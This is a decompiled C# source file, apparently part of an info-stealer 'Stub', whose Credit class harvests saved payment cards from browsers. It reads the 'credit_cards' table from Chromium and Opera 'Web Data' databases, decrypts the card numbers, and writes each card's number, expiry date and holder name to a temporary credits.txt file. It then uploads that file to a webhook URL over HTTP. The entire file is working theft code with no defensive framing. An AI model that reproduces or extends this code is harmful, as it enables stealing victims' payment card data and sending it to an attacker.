using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;

namespace Stub
{
	// Token: 0x0200002E RID: 46
	public static class Credit
	{
		// Token: 0x0600008B RID: 139 RVA: 0x00007154 File Offset: 0x00005354
		public static List<Credit.CreditCard> GetCC(string sWebData)
		{
			List<Credit.CreditCard> result;
			try
			{
				List<Credit.CreditCard> list = new List<Credit.CreditCard>();
				Plugin.SQLite sqlite = Plugin.SqlReader.ReadTable(sWebData, "credit_cards");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Credit.CreditCard item = default(Credit.CreditCard);
						item.sNumber = Plugin.Crypto.GetUTF8(Plugin.Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
						item.sExpYear = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 3));
						item.sExpMonth = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sName = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Plugin.Counter.CreditCards++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Credit.CreditCard>();
			}
			return result;
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00007224 File Offset: 0x00005424
		private static string FormatCreditCard(Credit.CreditCard cCard)
		{
			return string.Format("Producer| {0}\nDigits|  {1}\nExp Date| {2}\nCard Holder| {3}\n\n", new object[]
			{
				Plugin.Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00007284 File Offset: 0x00005484
		public static string GrabCCs()
		{
			foreach (string text in Program.Paths.sChromiumPswPaths)
			{
				string path;
				if (text.Contains("Opera Software"))
				{
					path = Program.Paths.appdata + text;
				}
				else
				{
					path = Program.Paths.lappdata + text;
				}
				if (Directory.Exists(path))
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						List<Credit.CreditCard> cc = Credit.GetCC(str + "\\Web Data");
						if (cc.Count > 0)
						{
							foreach (Credit.CreditCard cCard in cc)
							{
								File.WriteAllText(Program.tempFolder + "\\credits.txt", Credit.FormatCreditCard(cCard) + "\n");
							}
						}
					}
				}
			}
			string result;
			try
			{
				result = Functions.CreateDownloadLink(Program.tempFolder + "\\credits.txt");
			}
			catch
			{
				Credit.SendCCs();
				result = "Sent As File";
			}
			return result;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000073BC File Offset: 0x000055BC
		public static void SendCCs()
		{
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(Program.tempFolder + "\\credits.txt");
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "credits.txt");
				httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x0200002F RID: 47
		public struct CreditCard
		{
			// Token: 0x17000007 RID: 7
			// (get) Token: 0x0600008F RID: 143 RVA: 0x000028E1 File Offset: 0x00000AE1
			// (set) Token: 0x06000090 RID: 144 RVA: 0x000028E9 File Offset: 0x00000AE9
			public string sNumber { get; set; }

			// Token: 0x17000008 RID: 8
			// (get) Token: 0x06000091 RID: 145 RVA: 0x000028F2 File Offset: 0x00000AF2
			// (set) Token: 0x06000092 RID: 146 RVA: 0x000028FA File Offset: 0x00000AFA
			public string sExpYear { get; set; }

			// Token: 0x17000009 RID: 9
			// (get) Token: 0x06000093 RID: 147 RVA: 0x00002903 File Offset: 0x00000B03
			// (set) Token: 0x06000094 RID: 148 RVA: 0x0000290B File Offset: 0x00000B0B
			public string sExpMonth { get; set; }

			// Token: 0x1700000A RID: 10
			// (get) Token: 0x06000095 RID: 149 RVA: 0x00002914 File Offset: 0x00000B14
			// (set) Token: 0x06000096 RID: 150 RVA: 0x0000291C File Offset: 0x00000B1C
			public string sName { get; set; }
		}
	}
}
